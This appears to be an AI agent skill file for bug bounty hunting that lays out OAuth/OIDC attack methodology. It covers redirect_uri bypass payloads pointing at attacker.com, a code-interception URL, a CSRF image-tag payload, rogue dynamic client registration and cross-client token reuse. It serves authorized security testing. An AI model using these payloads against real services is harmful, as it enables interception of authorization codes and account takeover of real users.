---
name: hunt-oauth-oidc
description: Hunt OAuth 2.0 and OIDC vulnerabilities — authorization code interception via open redirect, CSRF on authorization endpoint (missing state), PKCE downgrade, token leakage in Referer headers, redirect_uri validation bypass (path traversal, subdomain wildcard, fragment injection), code injection via state parameter, implicit flow token exfil, dynamic client registration abuse, OIDC prompt bypass, and IdP-initiated SSO chain attacks. Use when testing OAuth flows, SSO logins, social auth (Google, GitHub, Apple), or any app issuing authorization codes. Critical when chained to account takeover. Keywords: oauth, oidc, authorization code, redirect_uri, state, pkce, access_token, id_token, client_id, SSO.
sources: hackerone_public, portswigger_research
report_count: 38
---

# HUNT-OAUTH-OIDC — Authorization Code Interception & Account Takeover

## Crown Jewel Targets

| Target type | Attack vector | Payout range |
|---|---|---|
| Any app with "Login with Google/GitHub/Apple" | Open redirect → code interception | $5k–$50k |
| SSO platforms (Okta, Auth0, Ping) | redirect_uri bypass, PKCE downgrade | $10k–$100k |
| Multi-app platforms (same IdP, many RPs) | Cross-client token confusion | $5k–$30k |
| Mobile apps (custom scheme) | Custom URI scheme hijacking | $3k–$20k |
| Dynamic client registration enabled | Register rogue client | $5k–$25k |

OAuth ATO is one of the highest-payout vulnerability classes. Programs pay top dollar because it's pre-auth and affects all users.

---

## Attack Surface Signals

**URL patterns to capture:**
```
/oauth/authorize?client_id=...&redirect_uri=...&response_type=code&state=...&scope=...
/auth/callback?code=...&state=...
/.well-known/openid-configuration
/oauth/token
/api/auth/[provider]     (Next.js Auth.js pattern)
```

**OIDC discovery doc fields to note:**
```bash
curl https://target.com/.well-known/openid-configuration | jq '{
  authorization_endpoint,
  token_endpoint,
  jwks_uri,
  registration_endpoint,
  response_types_supported,
  grant_types_supported
}'
```

**Dangerous response_types:**
- `token` — implicit flow, token in URL fragment
- `code token` — hybrid flow, token leaked before code exchange

---

## Step-by-Step Hunting Methodology

### Phase 1 — Map the OAuth flow

1. Start the OAuth login flow, intercept in Burp
2. Capture the authorization request: `GET /oauth/authorize?...`
3. Note all parameters: `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `nonce`, `code_challenge`
4. Find the registered `redirect_uri` values in app source, manifest, or by trial
5. Check if PKCE is used (`code_challenge` present)

### Phase 2 — redirect_uri validation bypass

The most impactful class. The server validates `redirect_uri` to prevent code interception — test every bypass:

**Path traversal:**
```
https://target.com/callback  →  registered (legit)
https://target.com/callback/../attacker   →  test this
https://target.com/callback%2F..%2Fattacker
```

**Subdomain/domain confusion:**
```
redirect_uri=https://target.com.attacker.com/callback
redirect_uri=https://attackertarget.com/callback
redirect_uri=https://target.com@attacker.com/callback
```

**Wildcard abuse:**
```
# If *.target.com is allowed and you can register attacker.target.com
redirect_uri=https://attacker.target.com/callback
```

**Open redirect on allowed domain:**
```
# target.com has an open redirect at /redirect?url=
redirect_uri=https://target.com/redirect?url=https://attacker.com/callback
```

```bash
# Construct the malicious auth URL:
https://idp.target.com/oauth/authorize?
  client_id=CLIENT_ID&
  response_type=code&
  redirect_uri=https://target.com/redirect?url=https://attacker.com&
  scope=openid+email&
  state=LEGITIMATE_STATE

# Victim clicks link, browser follows redirect chain, code lands at attacker.com
# Attacker exchanges code for token at token endpoint
```

**Fragment injection:**
```
redirect_uri=https://target.com/callback#
# Code arrives as: https://target.com/callback#code=AUTH_CODE
# But callback page JS reads fragment, which has code
```

**Port confusion:**
```
redirect_uri=https://target.com:80/callback  (non-standard port)
redirect_uri=https://target.com:8080/callback
```

### Phase 3 — CSRF (missing or weak state parameter)

If `state` is absent or predictable:

1. Start OAuth flow, capture the authorization URL
2. Drop the callback request (so your session doesn't bind to the code)
3. Send the authorization URL to a victim (email, XSS, or CSRF on a GET endpoint)
4. Victim clicks, their session gets bound to your social account → ATO

```
# Victim visits attacker.com which embeds:
<img src="https://target.com/auth/callback?code=ATTACKER_CODE&state=">
```

**Verification:** Remove `state` from the callback request. If it still processes → CSRF.

### Phase 4 — PKCE downgrade attack

If the server supports both PKCE and non-PKCE:

1. Intercept authorization request that has `code_challenge` + `code_challenge_method`
2. Remove both parameters from the request
3. Proceed through auth flow
4. At token exchange, omit `code_verifier`
5. If token is issued → PKCE is optional → vulnerable

```bash
# Original
GET /authorize?code_challenge=ABC&code_challenge_method=S256&...

# Downgraded
GET /authorize?...  # no challenge parameters
```

### Phase 5 — Authorization code interception via Referer

1. Find any page on the OAuth callback domain that loads external resources
2. If such a page exists, and the OAuth callback includes `?code=` in the URL, the `Referer` header will leak the code to external origins

```
# Callback URL: https://app.target.com/auth/callback?code=SECRET_CODE&state=...
# If this page has: <script src="https://cdn.analytics.com/track.js">
# Then Referer header sent to cdn.analytics.com contains the code
```

Check: does the callback page load ANY external resource (analytics, fonts, images)?

### Phase 6 — Token leakage in URL (implicit flow)

If `response_type=token` or hybrid:

```
https://target.com/callback#access_token=SECRET&token_type=bearer
```

Token is in URL fragment. If page loads external JS → token leaks via Referer.
Check browser history, server logs, proxies.

### Phase 7 — Cross-client token confusion

Test if an access token issued to client A can be used at client B's API:

```bash
# Get token for your low-privilege app (client A)
TOKEN=$(curl -s -X POST /oauth/token -d "code=$CODE&client_id=CLIENT_A&..." | jq -r .access_token)

# Try it at client B's (higher-privilege) API
curl https://api.client-b.target.com/admin -H "Authorization: Bearer $TOKEN"
```

Also test: use an access token at the token introspection endpoint with a different audience claim.

### Phase 8 — Dynamic client registration abuse

If `registration_endpoint` exists:

```bash
curl -X POST https://idp.target.com/connect/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Legit App",
    "redirect_uris": ["https://attacker.com/callback"],
    "response_types": ["code"],
    "grant_types": ["authorization_code"],
    "scope": "openid email profile"
  }'
```

If registration succeeds without authentication → any attacker can register a client and phish users.

### Phase 9 — OIDC-specific attacks

**nonce replay:** Reuse a captured `id_token` to authenticate again (if nonce not validated)

**Sub claim confusion:** If the app uses `sub` for user lookup but two IdPs can return the same `sub` value

**Prompt bypass:**
```
?prompt=none  # Skip re-authentication prompt — useful for silent re-auth testing
```

**Email claim injection:**
```
# Register social account with email: victim@target.com+attacker@gmail.com
# If app splits on +, email claim matches victim's account
```

---

## Automation

```bash
# ROADtools — Azure AD / OIDC recon
roadrecon gather -t TARGET_TENANT

# Detect OAuth endpoints
katana -u https://target.com | grep -iE 'oauth|authorize|callback|auth'

# Check OIDC discovery
curl -s https://target.com/.well-known/openid-configuration | jq .

# Fetch JWKS for JWT confusion follow-up
curl -s $(curl -s https://target.com/.well-known/openid-configuration | jq -r .jwks_uri) | jq .

# Test redirect_uri bypass list
for uri in "https://target.com.attacker.com/cb" "https://target.com@attacker.com/cb" "https://target.com/cb/../attacker"; do
  curl -s "https://idp.target.com/oauth/authorize?client_id=ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$uri'))")&response_type=code&state=test"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| redirect_uri bypass + open redirect | Authorization code interception → ATO | Critical |
| CSRF (missing state) | Forced login → ATO | Critical |
| PKCE downgrade | Code interception without verifier | High |
| Referer leakage | Code harvested from analytics | High |
| Dynamic client registration | Phishing with legit IdP branding | Critical |
| Cross-client confusion | Privilege escalation to higher-priv app | High |
| Implicit flow + external JS | Access token exfil | Critical |

---

## Validation

✅ **Confirmed code interception:** Your attacker server receives the authorization code in the URL

✅ **Confirmed CSRF:** Victim's session is bound to attacker's account after clicking link

✅ **Confirmed PKCE downgrade:** Token issued without `code_verifier` despite `code_challenge` in auth request

✅ **Confirmed dynamic registration:** POST to registration endpoint returns 200 with `client_id` and `client_secret`

✅ **Confirmed cross-client confusion:** Token issued for client A accepted by client B's API

### Severity assessment

| Scenario | CVSS | Typical payout |
|---|---|---|
| Code interception → ATO | Critical 9.6 | $10k–$50k |
| CSRF → account linking | Critical 9.1 | $5k–$25k |
| Dynamic client phishing | High 8.1 | $3k–$10k |
| Token leakage via Referer | Medium 6.5 | $1k–$5k |
| Cross-client privilege esc | High 8.1 | $3k–$10k |

### Related skills

Cross-reference: `hunt-jwt-confusion` (for id_token/access_token forgery after key extraction), `hunt-auth-bypass` (broader auth testing), `hunt-ssrf-cloud` (if redirect_uri points to internal host).
